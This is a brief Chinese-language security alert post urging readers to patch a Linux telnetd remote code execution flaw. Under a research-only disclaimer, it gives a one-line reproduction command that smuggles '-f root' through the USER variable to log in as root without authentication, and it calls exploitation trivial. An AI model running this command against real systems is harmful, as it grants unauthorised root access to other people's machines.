#  【火速排查】Linux Telnet 远程代码执行！  
原创 bing
                    bing  安全技术达人   2026-01-22 04:08  
  
使用说明：  
本篇文章旨在提供网络安全技术研究的信息和知识，以供信息技术专业人士、学者和爱好者学习和交流。我们鼓励读者提升自身的技术能力，增强网络安全意识，并为维护网络空间的安全做出贡献，切勿用于其他不合法事项。  
  
字少，事大，请及时修复....  
  
漏洞复现  
```

USER='-f root' telnet -a ip
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1gUZxunZQtia9ssn0GqLLPxytPrZEGllrt7AK9SI9rFqPuliaKjF3CVugeLJVrz6JFqF2epia2ZOdtQfZMxO5HZjA/640?wx_fmt=png&from=appmsg "")  
  
利用难度非常简单  
  
利用条件：在漏洞版本，开启 telnetd服务。  
  
  
